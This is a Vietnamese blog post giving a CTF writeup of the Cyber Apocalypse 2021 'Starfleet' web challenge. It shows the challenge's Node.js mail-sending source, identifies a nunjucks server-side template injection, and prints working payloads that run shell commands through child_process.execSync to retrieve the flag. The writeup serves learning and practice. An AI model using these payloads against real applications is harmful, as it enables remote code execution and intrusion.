@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.79.1 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Manh NV">
+<meta name="keywords" content=", development, cyber security">
+<meta name="description" content="1. Đề bài Bài này cho một web như vầy.
+Cho luôn source code như vầy Vậy bài này lại là một bài review source code.
+2. Giải quyết Các bạn để ý thì ảnh trên, bài thi cho địa chỉ web, khi truy cập vào thì có chức năng enroll với input cần điền vào là một email. Đọc vào source code thì có luôn chức năng send mail.">
+
+
+<meta property="og:description" content="1. Đề bài Bài này cho một web như vầy.
+Cho luôn source code như vầy Vậy bài này lại là một bài review source code.
+2. Giải quyết Các bạn để ý thì ảnh trên, bài thi cho địa chỉ web, khi truy cập vào thì có chức năng enroll với input cần điền vào là một email. Đọc vào source code thì có luôn chức năng send mail.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Cyber Apocalypse 2021]- Web Starfleet writeup">
+<meta name="twitter:title" content="[Cyber Apocalypse 2021]- Web Starfleet writeup">
+<meta property="og:url" content="https://manhnv.com/2021/04/cyber-apocalypse-2021-web-starfleet-writeup/">
+<meta property="twitter:url" content="https://manhnv.com/2021/04/cyber-apocalypse-2021-web-starfleet-writeup/">
+<meta property="og:site_name" content="Chia sẻ là niềm vui">
+<meta property="og:description" content="1. Đề bài Bài này cho một web như vầy.
+Cho luôn source code như vầy Vậy bài này lại là một bài review source code.
+2. Giải quyết Các bạn để ý thì ảnh trên, bài thi cho địa chỉ web, khi truy cập vào thì có chức năng enroll với input cần điền vào là một email. Đọc vào source code thì có luôn chức năng send mail.">
+<meta name="twitter:description" content="1. Đề bài Bài này cho một web như vầy.
+Cho luôn source code như vầy Vậy bài này lại là một bài review source code.
+2. Giải quyết Các bạn để ý thì ảnh trên, bài thi cho địa chỉ web, khi truy cập vào thì có chức năng enroll với input cần điền vào là một email. Đọc vào source code thì có luôn chức năng send mail.">
+<meta property="og:locale" content="vi">
+
+  
+    <meta property="article:published_time" content="2021-04-25T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2021-04-25T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="ctf">
+    
+  
+  
+    
+      <meta property="article:tag" content="ctf">
+    
+      <meta property="article:tag" content="Cyber Apocalypse 2021">
+    
+      <meta property="article:tag" content="ctf web writeup">
+    
+      <meta property="article:tag" content="writeup">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.09.16.png">
+  <meta property="twitter:image" content="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.09.16.png">
+
+
+
+
+
+  <meta property="og:image" content="https://manhnv.com/favicon.png">
+  <meta property="twitter:image" content="https://manhnv.com/favicon.png">
+
+
+    <title>[Cyber Apocalypse 2021]- Web Starfleet writeup</title>
+
+    <link rel="icon" href="https://manhnv.com/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://manhnv.com/2021/04/cyber-apocalypse-2021-web-starfleet-writeup/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://manhnv.com/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    <meta property="fb:pages" content="447047472469512" />
+
+<div id="fb-root"></div>
+<script>
+  window.fbAsyncInit = function() {
+    FB.init({
+      xfbml            : true,
+      version          : 'v9.0'
+    });
+  };
+
+  (function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = 'https://connect.facebook.net/en_US/sdk/xfbml.customerchat.js';
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+<div class="fb-customerchat"
+  attribution="setup_tool"
+  page_id="447047472469512"
+theme_color="#20cef5"
+logged_in_greeting="Hi! How can I help you?"
+logged_out_greeting="Hi! How can I help you?">
+</div>
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://manhnv.com/">Chia sẻ là niềm vui</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://manhnv.com/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://manhnv.com/#about">
+          <img class="sidebar-profile-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+        </a>
+        <h4 class="sidebar-profile-name">Manh NV</h4>
+        
+          <h5 class="sidebar-profile-bio">Chia sẻ là niềm vui</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/donate.html">
+    
+      <i class="sidebar-button-icon fa fa-usd"></i>
+      
+      <span class="sidebar-button-desc">Donate</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Trang chủ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Danh mục</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Thẻ thông tin</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Lưu trữ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">Thông tin</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/copyrights">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-copyright"></i>
+      
+      <span class="sidebar-button-desc">Copyrights</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/nguyenmanh1997" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://facebook.com/manhnv.sec" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-facebook"></i>
+      
+      <span class="sidebar-button-desc">Facebook</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.youtube.com/channel/UCEY3DBfSDupbSG96jfcSDwQ?sub_confirmation=1" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-youtube"></i>
+      
+      <span class="sidebar-button-desc">Youtube</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="5"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      [Cyber Apocalypse 2021]- Web Starfleet writeup
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-04-25T00:00:00Z">
+        
+  tháng 4 25, 2021
+
+      </time>
+    
+    
+  
+  
+    <span>mục</span>
+    
+      <a class="category-link" href="https://manhnv.com/categories/ctf">ctf</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <h2 id="1-đề-bài">1. Đề bài</h2>
+<p>Bài này cho một web như vầy.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.09.16.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.09.16.png"></p>
+<p>Cho luôn source code như vầy
+<img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.08.47.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.08.47.png"></p>
+<p>Vậy bài này lại là một bài review source code.</p>
+<h2 id="2-giải-quyết">2. Giải quyết</h2>
+<p>Các bạn để ý thì ảnh trên, bài thi cho địa chỉ web, khi truy cập vào thì có chức năng enroll với input cần điền vào là một email. Đọc vào source code thì có luôn chức năng send mail.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">nodemailer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;nodemailer&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">nunjucks</span>   <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;nunjucks&#39;</span>);
+
+<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
+
+    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">sendEmail</span>(<span style="color:#a6e22e">emailAddress</span>) {
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
+            <span style="color:#66d9ef">try</span> {
+                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> {
+                    <span style="color:#a6e22e">to</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">emailAddress</span>,
+                    <span style="color:#a6e22e">subject</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Enrollment is now under review ✅&#39;</span>,
+                };
+
+                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">NODE_ENV</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;production&#39;</span> ) {
+
+                    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">gifSrc</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;minimakelaris@hackthebox.eu&#39;</span>;
+                    
+                    <span style="color:#a6e22e">message</span>.<span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">nunjucks</span>.<span style="color:#a6e22e">renderString</span>(<span style="color:#e6db74">`
+</span><span style="color:#e6db74">                        &lt;p&gt;&lt;b&gt;Hello&lt;/b&gt; &lt;i&gt;</span><span style="color:#e6db74">${</span> <span style="color:#a6e22e">emailAddress</span> <span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/i&gt;&lt;/p&gt;
+</span><span style="color:#e6db74">                        &lt;p&gt;A cat has been deployed to process your submission 🐈&lt;/p&gt;&lt;br/&gt;
+</span><span style="color:#e6db74">                        &lt;img width=&#34;500&#34; height=&#34;350&#34; src=&#34;cid:{{ gifSrc }}&#34;/&gt;&lt;/p&gt;
+</span><span style="color:#e6db74">                        `</span>, { <span style="color:#a6e22e">gifSrc</span> }
+                    );
+
+                    <span style="color:#a6e22e">message</span>.<span style="color:#a6e22e">attachments</span> <span style="color:#f92672">=</span> [
+                        {
+                            <span style="color:#a6e22e">filename</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;minimakelaris.gif&#39;</span>,
+                            <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/../assets/minimakelaris.gif&#39;</span>,
+                            <span style="color:#a6e22e">cid</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">gifSrc</span>
+                        }
+                    ];
+
+                    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">transporter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">nodemailer</span>.<span style="color:#a6e22e">createTransport</span>({
+                        <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;smtp.gmail.com&#39;</span>,
+                        <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">465</span>,
+                        <span style="color:#a6e22e">secure</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+                        <span style="color:#a6e22e">auth</span><span style="color:#f92672">:</span> {
+                            <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;cbctf.2021.web.newjucks@gmail.com&#39;</span>,
+                            <span style="color:#a6e22e">pass</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;[REDACTED]&#39;</span>,
+                        },
+                        <span style="color:#a6e22e">logger</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+                    });
+
+                    <span style="color:#a6e22e">transporter</span>.<span style="color:#a6e22e">sendMail</span>(<span style="color:#a6e22e">message</span>);
+
+                    <span style="color:#a6e22e">transporter</span>.<span style="color:#a6e22e">close</span>();
+
+                    <span style="color:#a6e22e">resolve</span>({ <span style="color:#a6e22e">response</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;The email has been sent&#39;</span> });
+                } <span style="color:#66d9ef">else</span> {
+                    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">gifSrc</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;//i.pinimg.com/originals/bf/17/70/bf1770f704af814c3da78b0866b286c2.gif&#39;</span>;
+
+                    <span style="color:#a6e22e">message</span>.<span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">nunjucks</span>.<span style="color:#a6e22e">renderString</span>(<span style="color:#e6db74">`
+</span><span style="color:#e6db74">                        &lt;p&gt;&lt;b&gt;Hello&lt;/b&gt; &lt;i&gt;</span><span style="color:#e6db74">${</span> <span style="color:#a6e22e">emailAddress</span> <span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/i&gt;&lt;/p&gt;
+</span><span style="color:#e6db74">                        &lt;p&gt;A cat has been deployed to process your submission 🐈&lt;/p&gt;&lt;br/&gt;
+</span><span style="color:#e6db74">                        &lt;img width=&#34;540&#34; height=&#34;304&#34; src=&#34;{{ gifSrc }}&#34;/&gt;&lt;/p&gt;
+</span><span style="color:#e6db74">                        `</span>, { <span style="color:#a6e22e">gifSrc</span> }
+                    );
+
+                    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">testAccount</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">nodemailer</span>.<span style="color:#a6e22e">createTestAccount</span>();
+
+                    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">transporter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">nodemailer</span>.<span style="color:#a6e22e">createTransport</span>({
+                        <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;smtp.ethereal.email&#39;</span>,
+                        <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">587</span>,
+                        <span style="color:#a6e22e">auth</span><span style="color:#f92672">:</span> {
+                            <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">testAccount</span>.<span style="color:#a6e22e">user</span>,
+                            <span style="color:#a6e22e">pass</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">testAccount</span>.<span style="color:#a6e22e">pass</span>,
+                        },
+                        <span style="color:#a6e22e">logger</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+                    });
+
+                    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">info</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">transporter</span>.<span style="color:#a6e22e">sendMail</span>(<span style="color:#a6e22e">message</span>);
+
+                    <span style="color:#a6e22e">transporter</span>.<span style="color:#a6e22e">close</span>();
+                  
+                    <span style="color:#a6e22e">resolve</span>({ <span style="color:#a6e22e">response</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`&lt;iframe 
+</span><span style="color:#e6db74">                        style=&#39;height:calc(100vh - 4px); width:100%; box-sizing: border-box;&#39; scrolling=&#39;no&#39; frameborder=0 
+</span><span style="color:#e6db74">                        src=&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">nodemailer</span>.<span style="color:#a6e22e">getTestMessageUrl</span>(<span style="color:#a6e22e">info</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">                    &gt;`</span>});
+                }
+            } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+                <span style="color:#a6e22e">reject</span>({ <span style="color:#a6e22e">response</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Something went wrong&#39;</span> });
+            }
+        })
+    }
+};
+</code></pre></div><p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.10.07.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.10.07.png"></p>
+<p>Giải thích sơ qua thì chức năng send mail này sẽ lấy email được nhập từ input, và gửi tới email đó một đoạn nội dung như vầy.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">message</span>.<span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">nunjucks</span>.<span style="color:#a6e22e">renderString</span>(<span style="color:#e6db74">`
+</span><span style="color:#e6db74">                        &lt;p&gt;&lt;b&gt;Hello&lt;/b&gt; &lt;i&gt;</span><span style="color:#e6db74">${</span> <span style="color:#a6e22e">emailAddress</span> <span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/i&gt;&lt;/p&gt;
+</span><span style="color:#e6db74">                        &lt;p&gt;A cat has been deployed to process your submission 🐈&lt;/p&gt;&lt;br/&gt;
+</span><span style="color:#e6db74">                        &lt;img width=&#34;500&#34; height=&#34;350&#34; src=&#34;cid:{{ gifSrc }}&#34;/&gt;&lt;/p&gt;
+</span><span style="color:#e6db74">                        `</span>, { <span style="color:#a6e22e">gifSrc</span> }
+                    );
+</code></pre></div><p>Chúng ta thử xem qua khi điền vào một email thì ứng dụng web này sẽ gửi mail như nào nha.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.11.32.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.11.32.png"></p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.12.14.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.12.14.png"></p>
+<p>Các bạn để ý nội dung Email sử dụng <code>nunjucks.renderString()</code>, thể loại render nội dung HTML này hay gặp lỗi về SSTI lắm. Trong trường hợp này, email được lấy từ input không có check filters hay gì hết, mà đẩy thẳng vào renderString luôn, nên xác định đây là kiểu SSTI rồi và tập trung khai thác thôi.</p>
+<p>Vậy đã xác định được SSTI rồi, thì cách thử kinh điển nhất mà ở bài tutorial nào cũng hướng dẫn đó là sử dụng <code>{{7*7}}</code>. Về cơ bản thì nếu như có lỗi về SSTI thì sau khi render thành nội dung HTML <code>7*7 sẽ bằng 49</code>. Vậy tôi thử xem như nào nha.</p>
+<p>Giải thích chút về function sendMail(), ở cái biến <strong>to</strong> sẽ nhận vào một list các email sẽ được gửi tới và được ngăn cách nhau giữa các email bởi dấu <code>,</code>. Ví dụ: <code>xxx@gmail.com,yyy@gmail.com</code>. Nên là việc chúng ta thay <code>yyy@gmail.com</code> bằng <code>{{7*7}}</code> sẽ không gây lỗi gửi mail tới <code>xxx@gmail.com</code>.</p>
+<p>Rồi, bây giờ thử <code>{{7*7}}</code> nào.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.14.24.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.14.24.png"></p>
+<p>Các bạn sẽ thấy, email thứ 2 sẽ được hiển thị là <code>49</code>, chứ không còn là <code>{{7*7}}</code>.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.14.38.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.14.38.png"></p>
+<p>OK, khi đã xác định chắc chắn thế rồi, thì tôi có payload để chạy lệnh command bằng payload sau.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{{ (<span style="color:#ae81ff">0</span>).<span style="color:#a6e22e">toString</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString()\&#34;</span>)() <span style="color:#f92672">|</span> <span style="color:#a6e22e">dump</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">safe</span> }}
+</code></pre></div><p><code>Về phần làm sao viết được paload như thế nào, các bạn có thể google tham khảo cách call/load một global function/module từ một object js nhé.</code></p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.18.28.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.18.28.png"></p>
+<p>Sau khi gửi request kèm payload trên, chúng ta sẽ nhận được 1 mail như bên dưới.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.19.02.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.19.02.png"></p>
+<p>Vậy là đã có thể run được 1 command của hệ thống.
+Bây giờ quay trở lại folder source code, các bạn có thể nhìn thấy là đi kèm source code là 1 file <code>readflag.c</code>, file này được cho là có dụng ý, nên ta cần đọc nó chút nha.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.20.00.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.20.00.png"></p>
+<p>Nội dung <code>readflag.c</code> như sau.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.23.59.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.23.59.png"></p>
+<p>vậy flag được đặt trong <code>/root/flag</code>, vậy thì phải cần quyền <code>root</code> thì mới có thể đọc được file <code>flag</code>. Kiểm tra xem user đang chạy ứng dụng web quyền gì nhé (Thường thì không ai chạy mấy ứng dụng web với quyền root đâu, nhưng cứ check thôi).</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.25.06.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.25.06.png"></p>
+<p>Đó, ứng dụng web đã không chạy với quyền root, nên không thể sử dụng <code>cat /root/flag</code> được đâu nhé. Bây giờ xác định xem <code>readflag.c</code> đang nằm ở đâu với payload sau.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{{ (<span style="color:#ae81ff">0</span>).<span style="color:#a6e22e">toString</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cd ..;ls&#39;).toString()\&#34;</span>)() <span style="color:#f92672">|</span> <span style="color:#a6e22e">dump</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">safe</span> }}
+</code></pre></div><p>OK, vậy là file <code>readflag.c</code> đã được compile thằng file <code>readflag</code>.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.21.36.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.21.36.png"></p>
+<p>Bây giờ chỉ cần run file đó lên thôi, payload run nó lên như sau.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{{ (<span style="color:#ae81ff">0</span>).<span style="color:#a6e22e">toString</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cd ..;./readflag&#39;).toString()\&#34;</span>)() <span style="color:#f92672">|</span> <span style="color:#a6e22e">dump</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">safe</span> }}
+</code></pre></div><p>Được rồi, nó đã work, và flag đã được gửi về mail.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.23.06.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Starfleet/Screen_Shot_2021-04-24_at_23.23.06.png"></p>
+<p><code>Flag là: CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}</code></p>
+
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">THẺ ĐÁNH DẤU</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/ctf/">ctf</a>
+
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/cyber-apocalypse-2021/">Cyber Apocalypse 2021</a>
+
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/ctf-web-writeup/">ctf web writeup</a>
+
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/writeup/">writeup</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2021/04/cyber-apocalypse-2021-web-ministryplace-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Web MiniSTRyplace writeup">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2021/01/i-passed-oswe-nguon-goc-va-suc-manh-tu-tin-va-su-co-gang/" data-tooltip="[I passed OSWE] Nguồn gốc và sức mạnh | Tự tin và sự cố gắng">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
